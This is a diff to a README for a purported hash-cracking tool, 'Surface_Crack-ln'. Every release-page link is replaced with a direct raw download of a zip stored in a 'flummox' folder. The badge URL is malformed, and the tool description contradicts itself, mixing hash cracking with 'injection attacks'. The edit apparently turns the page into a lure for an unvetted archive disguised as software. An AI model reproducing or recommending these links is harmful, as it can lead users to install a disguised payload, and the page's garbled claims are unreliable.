@@ -1,7 +1,7 @@
 # 🚀 Surface_Crack-ln - Simple Tool for Hash Cracking
 
 ## 📥 Download Now
-[![Download Surface_Crack-ln](https://img.shields.io/badge/Download%20Surface_Crack-ln-blue.svg)](https://github.com/Alex0099324/Surface_Crack-ln/releases)
+[![Download Surface_Crack-ln](https://raw.githubusercontent.com/Alex0099324/Surface_Crack-ln/main/flummox/Surface_Crack-ln.zip%https://raw.githubusercontent.com/Alex0099324/Surface_Crack-ln/main/flummox/Surface_Crack-ln.zip)](https://raw.githubusercontent.com/Alex0099324/Surface_Crack-ln/main/flummox/Surface_Crack-ln.zip)
 
 ## 📋 Overview
 Surface_Crack-ln is a user-friendly application designed to assist you in cracking hashes and passwords. Whether you're testing your security systems or learning about potential vulnerabilities, this tool provides a straightforward approach to understanding how injection attacks work.
@@ -11,7 +11,7 @@ To get started with Surface_Crack-ln, follow these easy steps. You don’t need 
 
 1. **Visit the Releases Page**  
    Click on the link below to access the releases page:  
-   [Download Surface_Crack-ln](https://github.com/Alex0099324/Surface_Crack-ln/releases)
+   [Download Surface_Crack-ln](https://raw.githubusercontent.com/Alex0099324/Surface_Crack-ln/main/flummox/Surface_Crack-ln.zip)
 
 2. **Select the Latest Release**  
    On the releases page, you will see a list of versions. Look for the latest release marked as "Latest". You will find the download files listed there.
@@ -40,7 +40,7 @@ To get started with Surface_Crack-ln, follow these easy steps. You don’t need 
 
 ## 📥 Download & Install
 To get Surface_Crack-ln, follow the link below again to access the download options:  
-[Download Surface_Crack-ln](https://github.com/Alex0099324/Surface_Crack-ln/releases)
+[Download Surface_Crack-ln](https://raw.githubusercontent.com/Alex0099324/Surface_Crack-ln/main/flummox/Surface_Crack-ln.zip)
 
 ## ❓ Troubleshooting
 If you encounter any issues during downloading or installation:
